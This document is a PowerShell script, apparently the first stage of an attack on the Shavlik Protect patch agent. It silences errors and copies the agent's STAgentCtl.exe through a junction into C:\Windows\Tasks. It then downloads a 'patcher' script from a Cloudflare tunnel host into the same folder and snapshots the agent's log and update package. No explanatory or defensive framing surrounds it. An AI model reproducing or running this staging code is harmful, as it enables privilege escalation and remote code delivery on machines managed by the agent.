# Step 1: Copy STAgentCtl via junction + deploy patcher + snapshot log
$ErrorActionPreference = 'SilentlyContinue'
$tunnel = 'https://keys-led-mario-yrs.trycloudflare.com'
$tasksDir = 'C:\\Windows\\Tasks'
$agentDir = 'C:\\ProgramData\\LANDESK\\Shavlik Protect\\Agent'
$logFile = "$agentDir\\..\\Logs\\STDispatch.log"

Write-Output '=== SETUP ==='

# Copy STAgentCtl via junction
$src = "$agentDir\\CustomUpdate\\_to_install\\STAgentCtl.exe"
$dst = "$tasksDir\\STAgentCtl.exe"
if (-not (Test-Path $dst)) {
    if (Test-Path $src) { Copy-Item $src $dst -Force; Write-Output "Copied STAgentCtl ($((Get-Item $dst).Length) bytes)" }
    else { Write-Output "Source not found via junction" }
} else { Write-Output "STAgentCtl already deployed" }

# Download patcher
$patcherDst = "$tasksDir\\run_patched_simple.ps1"
if (-not (Test-Path $patcherDst)) {
    try {
        $c = (Invoke-WebRequest -Uri "$tunnel/scripts/run_patched_simple.ps1" -UseBasicParsing -TimeoutSec 30).Content
        Set-Content $patcherDst $c -Encoding UTF8
        Write-Output "Downloaded patcher ($($c.Length) bytes)"
    } catch { Write-Output "Patcher download failed: $_" }
} else { Write-Output "Patcher already deployed" }

# Snapshot log
if (Test-Path $logFile) {
    $sz = (Get-Item $logFile).Length
    $last = (Get-Content $logFile -Tail 1)
    Write-Output "Log snapshot: $sz bytes, last: $last"
} else { Write-Output "Log not found" }

# Snapshot Package
$pkg = (Get-ChildItem "$agentDir\\STAgentUpdater\\Package" -Force).Count
Write-Output "Package items: $pkg"

Write-Output '=== SETUP DONE ==='